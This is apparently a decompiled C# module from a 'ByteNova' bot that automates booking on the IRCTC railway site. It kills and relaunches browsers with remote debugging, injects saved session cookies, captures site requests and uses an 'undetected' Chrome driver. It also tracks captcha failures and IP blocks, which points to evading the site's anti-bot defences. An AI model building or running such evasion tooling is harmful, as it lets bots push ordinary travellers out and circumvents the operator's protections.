using APP_FRAMEWORK;
using IRCommDLL;
using Microsoft.Playwright;
using Microsoft.Win32;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using SeleniumUndetectedChromeDriver;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Net.WebSockets;
using System.Reactive.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Websocket.Client;
using static System.Net.Mime.MediaTypeNames;
namespace NEXUS.IRCommDLL;

internal class Playwright_Automation
{
    public enum TargetBrowser
    {
        Edge,
        Chrome
    }

    public class ChromeCookie
    {
        public string domain { get; set; }

        public double? expirationDate { get; set; }

        public bool hostOnly { get; set; }

        public bool httpOnly { get; set; }

        public string name { get; set; }

        public string path { get; set; }

        public string sameSite { get; set; }

        public bool secure { get; set; }

        public bool session { get; set; }

        public string storeId { get; set; }

        public string value { get; set; }
    }

    internal clsMain clsM;

    internal clsPostData class3_0;

    internal bool invalidCaptcha;

    internal bool invalidUser;

    internal bool ipBlock_onLogin;

    internal bool BrowserLoded;

    internal string blankHtml = "<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n <meta charset=\"UTF-8\">\r\n <title>ByteNova</title>\r\n <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n\r\n <style>\r\n body {\r\n margin: 0;\r\n padding: 0;\r\n background: radial-gradient(circle at top, #111 0%, #000 70%);\r\n display: flex;\r\n justify-content: center;\r\n align-items: center;\r\n height: 100vh;\r\n font-family: Arial, Helvetica, sans-serif;\r\n color: white;\r\n }\r\n\r\n .container {\r\n text-align: center;\r\n }\r\n\r\n .container img {\r\n max-width: 420px;\r\n width: 80%;\r\n filter: drop-shadow(0 0 25px rgba(255,255,255,0.25));\r\n }\r\n\r\n .title {\r\n margin-top: 20px;\r\n font-size: 28px;\r\n letter-spacing: 3px;\r\n }\r\n\r\n .subtitle {\r\n margin-top: 6px;\r\n font-size: 14px;\r\n color: #aaa;\r\n }\r\n </style>\r\n</head>\r\n<body>\r\n\r\n <div class=\"container\">\r\n <!-- ByteNova Logo Image -->\r\n <img src=\"data:image/jpeg;base64,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\" alt=\"Express Logo\">\r\n\r\n <div class=\"subtitle\">Trusted Software Solutions for Secure and Fast Bookings</div>\r\n </div>\r\n\r\n</body>\r\n</html>\r\n";

    private bool mProcess;

    internal Playwright_Automation(clsMain clsMain0, clsPostData clsPostData0)
    {
        clsM = clsMain0;
        class3_0 = clsPostData0;
    }

    internal IPage StartEdgeAndConnect0(ref string userDataDir00, Rectangle rect)
    {
        IPage page = null;
        try
        {
            int num = 9222;
            try
            {
                ProcessStartInfo processStartInfo = new ProcessStartInfo();
                string fileName = "cmd.exe";
                processStartInfo.FileName = fileName;
                string arguments = "/c taskkill /F /IM msedge.exe";
                processStartInfo.Arguments = arguments;
                processStartInfo.CreateNoWindow = true;
                processStartInfo.UseShellExecute = false;
                Process.Start(processStartInfo).WaitForExit();
            }
            catch
            {
            }
            Thread.Sleep(2000);
            string text = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
            string text2 = text;
            string format = "--remote-debugging-port={0} ";
            string text3 = string.Format(format, num);
            string text4 = "--remote-debugging-address=127.0.0.1 ";
            string text5 = text3 + text4;
            ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
            string fileName2 = "cmd.exe";
            processStartInfo2.FileName = fileName2;
            string text6 = "/c start \"\" \"";
            string text7 = "\" ";
            processStartInfo2.Arguments = text6 + text2 + text7 + text5;
            processStartInfo2.CreateNoWindow = true;
            processStartInfo2.UseShellExecute = false;
            Process.Start(processStartInfo2);
            Thread.Sleep(5000);
            IBrowserType chromium = Playwright.CreateAsync().GetAwaiter().GetResult().Chromium;
            string format2 = "http://127.0.0.1:{0}";
            IBrowser result = chromium.ConnectOverCDPAsync(string.Format(format2, num)).GetAwaiter().GetResult();
            IBrowserContext browserContext = result.Contexts[0];
            page = ((browserContext.Pages.Count <= 0) ? browserContext.NewPageAsync().GetAwaiter().GetResult() : browserContext.Pages[0]);
            try
            {
                ICDPSession result2 = page.Context.NewCDPSessionAsync(page).GetAwaiter().GetResult();
                string method = "Browser.getWindowForTarget";
                JsonElement? result3 = result2.SendAsync(method).GetAwaiter().GetResult();
                if (result3.HasValue)
                {
                    JsonElement value = result3.Value;
                    string propertyName = "windowId";
                    int @int = value.GetProperty(propertyName).GetInt32();
                    Dictionary<string, object> dictionary = new Dictionary<string, object>();
                    string key = "windowId";
                    dictionary.Add(key, @int);
                    string key2 = "bounds";
                    Dictionary<string, object> dictionary2 = new Dictionary<string, object>();
                    string key3 = "width";
                    dictionary2.Add(key3, 450);
                    string key4 = "height";
                    dictionary2.Add(key4, 900);
                    string key5 = "windowState";
                    string value2 = "normal";
                    dictionary2.Add(key5, value2);
                    dictionary.Add(key2, dictionary2);
                    Dictionary<string, object> args = dictionary;
                    string method2 = "Browser.setWindowBounds";
                    result2.SendAsync(method2, args).GetAwaiter().GetResult();
                }
            }
            catch (Exception ex)
            {
                string text8 = "[CDP Resize Error]: ";
                Console.WriteLine(text8 + ex.ToString());
            }
            CaptureIRCTCRequests(page);
            string path = "irctc_cookies.json";
            File.ReadAllText(path);
            browserContext = result.Contexts[0];
            page = browserContext.Pages[0];
            LoadCookiesFromJsonToBrowser(browserContext);
            IPage page2 = page;
            string url = "https://www.irctc.co.in/nget/train-search";
            page2.GotoAsync(url, new PageGotoOptions
            {
                WaitUntil = WaitUntilState.DOMContentLoaded
            }).GetAwaiter().GetResult();
        }
        catch (Exception ex2)
        {
            MessageBox.Show(ex2.ToString());
        }
        return page;
    }

    private int GetFreeTcpPort()
    {
        TcpListener tcpListener = new TcpListener(IPAddress.Loopback, 0);
        tcpListener.Start();
        int port = ((IPEndPoint)tcpListener.LocalEndpoint).Port;
        tcpListener.Stop();
        return port;
    }
    private string GetCometPath()
    {
        try
        {
            // REGISTRY CHECK
            using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\comet.exe"))
            {
                if (registryKey != null)
                {
                    string regPath = registryKey.GetValue("")?.ToString();

                    if (!string.IsNullOrEmpty(regPath) && File.Exists(regPath))
                    {
                        Console.WriteLine("Comet Found From Registry : " + regPath);
                        return regPath;
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Registry Error : " + ex.ToString());
        }

        // COMMON PATHS
        string[] possiblePaths =
        {
        // YOUR SYSTEM PATH
        @"C:\Program Files\Perplexity\Comet\Application\comet.exe",

        // USER LOCAL PATH
        @"C:\Users\" + Environment.UserName + @"\AppData\Local\Comet\Application\comet.exe",

        // PROGRAM FILES X64
        @"C:\Program Files\Comet\Application\comet.exe",

        // PROGRAM FILES X86
        @"C:\Program Files (x86)\Comet\Application\comet.exe",

        // PERPLEXITY X86
        @"C:\Program Files (x86)\Perplexity\Comet\Application\comet.exe"
    };

        foreach (string path in possiblePaths)
        {
            try
            {
                if (File.Exists(path))
                {
                    Console.WriteLine("Comet Found : " + path);
                    return path;
                }
            }
            catch
            {
            }
        }

        // AUTO SEARCH FULL DRIVE
        try
        {
            string[] drives = Environment.GetLogicalDrives();

            foreach (string drive in drives)
            {
                try
                {
                    string[] files = Directory.GetFiles(
                        drive,
                        "comet.exe",
                        SearchOption.AllDirectories
                    );

                    foreach (string file in files)
                    {
                        if (file.ToLower().Contains("comet"))
                        {
                            Console.WriteLine("Comet Auto Found : " + file);
                            return file;
                        }
                    }
                }
                catch
                {
                }
            }
        }
        catch
        {
        }

        throw new FileNotFoundException(
            "Comet Browser system par nahi mila."
        );
    }
    private string GetEdgePath()
    {
        try
        {
            RegistryKey localMachine = Registry.LocalMachine;
            string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe";
            using RegistryKey registryKey = localMachine.OpenSubKey(name);
            if (registryKey != null)
            {
                string text = registryKey.GetValue("")?.ToString();
                if (!string.IsNullOrEmpty(text) && File.Exists(text))
                {
                    return text;
                }
            }
        }
        catch (Exception ex)
        {
            string text2 = "Registry se Edge path nikalne mein error: ";
            Console.WriteLine(text2 + ex.ToString());
        }
        string[] array = new string[2];
        string text3 = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
        array[0] = text3;
        string text4 = "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe";
        array[1] = text4;
        string[] array2 = array;
        foreach (string text5 in array2)
        {
            if (File.Exists(text5))
            {
                return text5;
            }
        }
        string message = "Microsoft Edge is system par nahi mila. Kripya ise install karein.";
        throw new FileNotFoundException(message);
    }

    private string GetBrowserPath(TargetBrowser browser)
    {
        string text2;
        if (browser == TargetBrowser.Edge)
        {
            string text = "msedge.exe";
            text2 = text;
        }
        else
        {
            string text3 = "chrome.exe";
            text2 = text3;
        }
        string text4 = text2;
        string text5 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\";
        string name = text5 + text4;
        try
        {
            using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name);
            if (registryKey != null)
            {
                string text6 = registryKey.GetValue("")?.ToString();
                if (!string.IsNullOrEmpty(text6) && File.Exists(text6))
                {
                    return text6;
                }
            }
        }
        catch (Exception ex)
        {
            string format = "Registry se {0} path nikalne mein error: {1}";
            Console.WriteLine(string.Format(format, browser, ex.ToString()));
        }
        List<string> list = new List<string>();
        if (browser != 0)
        {
            string item = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
            list.Add(item);
            string item2 = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";
            list.Add(item2);
            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string text7 = "\\Google\\Chrome\\Application\\chrome.exe";
            list.Add(folderPath + text7);
        }
        else
        {
            string item3 = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
            list.Add(item3);
            string item4 = "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe";
            list.Add(item4);
        }
        foreach (string item5 in list)
        {
            if (File.Exists(item5))
            {
                return item5;
            }
        }
        string format2 = "{0} is system par nahi mila. Kripya ise install karein.";
        throw new FileNotFoundException(string.Format(format2, browser));
    }

    private string GetChromePath()
    {
        try
        {
            RegistryKey localMachine = Registry.LocalMachine;
            string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe";
            using RegistryKey registryKey = localMachine.OpenSubKey(name);
            if (registryKey != null)
            {
                string text = registryKey.GetValue("")?.ToString();
                if (!string.IsNullOrEmpty(text) && File.Exists(text))
                {
                    return text;
                }
            }
        }
        catch (Exception ex)
        {
            string text2 = "Registry se Chrome path nikalne mein error: ";
            Console.WriteLine(text2 + ex.ToString());
        }
        string[] array = new string[3];
        string text3 = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
        array[0] = text3;
        string text4 = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";
        array[1] = text4;
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string text5 = "\\Google\\Chrome\\Application\\chrome.exe";
        array[2] = folderPath + text5;
        string[] array2 = array;
        foreach (string text6 in array2)
        {
            if (File.Exists(text6))
            {
                return text6;
            }
        }
        string message = "Google Chrome is system par nahi mila. Kripya ise install karein.";
        throw new FileNotFoundException(message);
    }
    private string GetBravePath()
    {
        try
        {
            RegistryKey localMachine = Registry.LocalMachine;
            string regPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\brave.exe";

            using (RegistryKey key = localMachine.OpenSubKey(regPath))
            {
                if (key != null)
                {
                    string path = key.GetValue("")?.ToString();

                    if (!string.IsNullOrEmpty(path) && File.Exists(path))
                    {
                        return path;
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Registry se Brave path nikalne mein error: " + ex.ToString());
        }

        // Default install locations
        string[] possiblePaths = new string[]
        {
        @"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
        @"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe"
        };

        foreach (string path in possiblePaths)
        {
            if (File.Exists(path))
            {
                return path;
            }
        }

        throw new FileNotFoundException("Brave browser system par nahi mila. Kripya ise install karein.");
    }
    private void KillOldOperaByProfile(string profilePath)
    {
        if (string.IsNullOrEmpty(profilePath))
            return;

        try
        {
            Console.WriteLine($"[Cleanup] {profilePath} wali Opera profile ko close kar rahe hain...");

            string query = "SELECT ProcessId, CommandLine FROM Win32_Process WHERE Name='opera.exe'";

            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
            {
                foreach (ManagementObject item in searcher.Get())
                {
                    string cmd = item["CommandLine"]?.ToString() ?? "";

                    if (cmd.IndexOf(profilePath, StringComparison.OrdinalIgnoreCase) >= 0)
                    {
                        int pid = Convert.ToInt32(item["ProcessId"]);

                        try
                        {
                            Process proc = Process.GetProcessById(pid);
                            proc.Kill();
                            proc.WaitForExit(1000);

                            Console.WriteLine($"[Success] Opera Process (PID: {pid}) killed.");
                        }
                        catch
                        {
                            // ignore
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[Cleanup Error]: " + ex.ToString());
        }
    }
    internal void KillOldEdgeByProfile(string profilePath)
    {
        if (string.IsNullOrEmpty(profilePath))
        {
            while (true)
            {
                int[,,,] array = new int[2, 5, 1, 1]
                {
                    {
                        { { -1688427157 } },
                        { { 1882957692 } },
                        { { 349736578 } },
                        { { 287547570 } },
                        { { 349736577 } }
                    },
                    {
                        { { -1026079494 } },
                        { { 1088423441 } },
                        { { 1595373749 } },
                        { { 503921573 } },
                        { { -372643436 } }
                    }
                };
                switch (~array[0, 4, 0, 0] ^ -349736577)
                {
                    case 0:
                        continue;
                    case 1:
                        return;
                }
                break;
            }
        }
        try
        {
            string text = "[Cleanup] ";
            string text2 = " wali profile ko close kar rahe hain...";
            Console.WriteLine(text + profilePath + text2);
            string queryString = "SELECT ProcessId, CommandLine FROM Win32_Process WHERE Name='msedge.exe'";
            using ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(queryString);
            foreach (ManagementObject item in managementObjectSearcher.Get())
            {
                string propertyName = "CommandLine";
                object obj = item[propertyName];
                object obj2;
                if (obj == null)
                {
                    obj2 = null;
                }
                else
                {
                    obj2 = obj.ToString();
                    if (obj2 != null)
                    {
                        goto IL_00c3;
                    }
                }
                obj2 = "";
                goto IL_00c3;
            IL_00c3:
                if (((string)obj2).IndexOf(profilePath, StringComparison.OrdinalIgnoreCase) >= 0)
                {
                    string propertyName2 = "ProcessId";
                    int num = Convert.ToInt32(item[propertyName2]);
                    try
                    {
                        Process processById = Process.GetProcessById(num);
                        processById.Kill();
                        processById.WaitForExit(1000);
                        string format = "[Success] Edge Process (PID: {0}) killed.";
                        Console.WriteLine(string.Format(format, num));
                    }
                    catch
                    {
                    }
                }
            }
        }
        catch (Exception ex)
        {
            string text3 = "[Cleanup Error]: ";
            Console.WriteLine(text3 + ex.ToString());
        }
    }
    private void KillOldCometByProfile(string profilePath)
    {
        if (string.IsNullOrWhiteSpace(profilePath))
        {
            return;
        }

        try
        {
            Console.WriteLine("[Cleanup] Closing Comet Profile: " + profilePath);

            /* COMET PROCESS SEARCH */
            string query =
                "SELECT ProcessId, CommandLine " +
                "FROM Win32_Process " +
                "WHERE Name='comet.exe'";

            using (ManagementObjectSearcher searcher =
                new ManagementObjectSearcher(query))
            {
                foreach (ManagementObject item in searcher.Get())
                {
                    try
                    {
                        string cmd = item["CommandLine"]?.ToString() ?? "";

                        /* PROFILE MATCH */
                        if (cmd.IndexOf(
                            profilePath,
                            StringComparison.OrdinalIgnoreCase) >= 0)
                        {
                            int pid = Convert.ToInt32(item["ProcessId"]);

                            try
                            {
                                Process proc = Process.GetProcessById(pid);

                                proc.Kill();

                                proc.WaitForExit(3000);

                                Console.WriteLine(
                                    $"[Success] Comet Process Killed PID: {pid}"
                                );
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine(
                                    "[Kill Error] " + ex.Message
                                );
                            }
                        }
                    }
                    catch
                    {
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine(
